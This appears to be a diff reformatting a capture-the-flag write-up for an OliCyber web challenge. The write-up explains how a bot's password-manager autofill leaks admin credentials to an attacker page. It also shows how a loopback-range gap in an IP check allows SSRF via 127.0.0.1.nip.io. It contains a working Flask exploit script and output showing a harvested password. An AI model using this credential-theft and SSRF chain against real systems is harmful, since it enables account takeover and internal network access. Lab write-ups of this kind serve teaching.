@@ -40,23 +40,24 @@ The flag is served on `127.0.0.1:1337`, bound only to localhost. Nothing fancy �
 **The Report endpoint and what the bot does:**
 
 ```js
-app.post('/report', (req, res) => {
-    fetch('http://'+HEADLESS_HOST, {
-        method: 'POST',
-        body: JSON.stringify({
-            actions: [
-                {type: "request", url: req.body.url, method: "GET"},
-                {type: "sleep", time: 2},
-                {type: "click", element: "#pwn"},
-                ...__trigger_browser_password_manager,
-                {type: "click", element: "#pwn"}
-            ],
-        }),
-    })
+app.post("/report", (req, res) => {
+  fetch("http://" + HEADLESS_HOST, {
+    method: "POST",
+    body: JSON.stringify({
+      actions: [
+        { type: "request", url: req.body.url, method: "GET" },
+        { type: "sleep", time: 2 },
+        { type: "click", element: "#pwn" },
+        ...__trigger_browser_password_manager,
+        { type: "click", element: "#pwn" },
+      ],
+    }),
+  });
 });
 ```
 
 This tells the headless browser to:
+
 1. Visit a URL we submit
 2. Wait 2 seconds
 3. Click a button with `id="pwn"`
@@ -85,25 +86,26 @@ The login form expects a **base64-encoded** password. It decodes it, checks it, 
 
 ```js
 app.post("/panel", async (req, res) => {
-    let x = new URL(req.body.link);
-    if(x.hostname === "localhost") throw "Invalid IP";
-    let ip = await dns.promises.resolve(x.hostname);
-    if(ipaddr.parse(ip[0]).range() === "private") throw "Invalid IP";
-    return panel(res, `Content: ${await (await fetch(req.body.link)).text()}`);
+  let x = new URL(req.body.link);
+  if (x.hostname === "localhost") throw "Invalid IP";
+  let ip = await dns.promises.resolve(x.hostname);
+  if (ipaddr.parse(ip[0]).range() === "private") throw "Invalid IP";
+  return panel(res, `Content: ${await (await fetch(req.body.link)).text()}`);
 });
 ```
 
 The server checks two things:
+
 1. Hostname isn't literally the string `"localhost"`
 2. The resolved IP isn't in the `"private"` range
 
 The bug is in the second check. The `ipaddr.js` library classifies IPs into named range buckets. The server only blocks `"private"` — but `127.0.0.1` falls into `"loopback"`, which is a completely separate bucket and **not blocked at all**.
 
-| IP            | `ipaddr.range()`  | Blocked? |
-|---------------|-------------------|----------|
-| 10.0.0.1      | `"private"`       | ✅ Yes   |
-| 192.168.1.1   | `"private"`       | ✅ Yes   |
-| 127.0.0.1     | `"loopback"`      | ❌ No    |
+| IP          | `ipaddr.range()` | Blocked? |
+| ----------- | ---------------- | -------- |
+| 10.0.0.1    | `"private"`      | ✅ Yes   |
+| 192.168.1.1 | `"private"`      | ✅ Yes   |
+| 127.0.0.1   | `"loopback"`     | ❌ No    |
 
 So we just need a hostname that resolves to `127.0.0.1` but isn't literally `"localhost"`.
 
@@ -157,8 +159,6 @@ No redirect, no external server involved. The panel server resolves and fetches 
 A Flask server handled both steps — serving the credential-theft page and then firing the SSRF once the password came in:
 
 ```python
-#!/usr/bin/env python3
-
 from flask import Flask, request
 import requests
 
@@ -212,8 +212,6 @@ PAYLOAD = f"""
 </html>
 """
 
-# SSRF target: nip.io resolves ANY subdomain named after an IP to that IP.
-# 127.0.0.1.nip.io -> 127.0.0.1 (loopback range, NOT private — bypasses check!)
 SSRF_LINK = "http://127.0.0.1.nip.io:1337/"
 
 @app.route('/', methods=["GET", "POST"])
@@ -231,10 +229,8 @@ def index():
         app.logger.warning("[!] Empty password — bot may not have autofilled yet")
         return "ok"
 
-    # Authenticate: set cookie directly (server stores plaintext password in cookie)
     s.cookies.set("passw", password, domain="superadminpanel.challs.olicyber.it")
 
-    # Verify auth works
     check = s.get("http://superadminpanel.challs.olicyber.it/panel")
     if "Test website functionality" not in check.text:
         app.logger.error("[!] Auth failed — wrong password or cookie rejected")
@@ -243,7 +239,6 @@ def index():
 
     app.logger.info("[+] Auth OK! Sending SSRF payload...")
 
-    # Fire SSRF: nip.io bypasses the loopback/private range check
     resp = s.post(
         "http://superadminpanel.challs.olicyber.it/panel",
         data={"link": SSRF_LINK}
@@ -254,7 +249,6 @@ def index():
     app.logger.info(resp.text)
     app.logger.info("=========== FLAG RESPONSE END ===========")
 
-    # Extract just the Content: ... part for convenience
     if "Content:" in resp.text:
         start = resp.text.find("Content:") + len("Content:")
         end = resp.text.find("</div>", start)
@@ -269,6 +263,7 @@ if __name__ == "__main__":
 ```
 
 **Running it:**
+
 1. Start the Flask server, expose it with ngrok
 2. Go to the challenge site → Report → submit your ngrok URL
 3. Bot visits your page, autofills admin creds, submits to your server
@@ -280,13 +275,13 @@ if __name__ == "__main__":
 ## Output
 
 ```
-[2026-05-11 17:23:16,152] INFO in script: 
+[2026-05-11 17:23:16,152] INFO in script:
 [+] Username: admin
 [2026-05-11 17:23:16,152] INFO in script: [+] Password: goodluckcrackingthis_012391293
 [2026-05-11 17:23:16,569] INFO in script: [+] Auth OK! Sending SSRF payload...
 [2026-05-11 17:23:16,879] INFO in script: [+] SSRF Status: 200
 [2026-05-11 17:23:16,879] INFO in script: ========== FLAG RESPONSE START ==========
-[2026-05-11 17:23:16,879] INFO in script: 
+[2026-05-11 17:23:16,879] INFO in script:
 <html>
     <head>
         <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&amp;family=Inter:wght@300&amp;display=swap" rel="stylesheet">
@@ -306,7 +301,7 @@ if __name__ == "__main__":
     </body>
 </html>
 [2026-05-11 17:23:16,879] INFO in script: =========== FLAG RESPONSE END ===========
-[2026-05-11 17:23:16,879] INFO in script: 
+[2026-05-11 17:23:16,879] INFO in script:
 
 🚩 FLAG: flag{I_L0v3_st34ling_auTOf1ll}
 ```
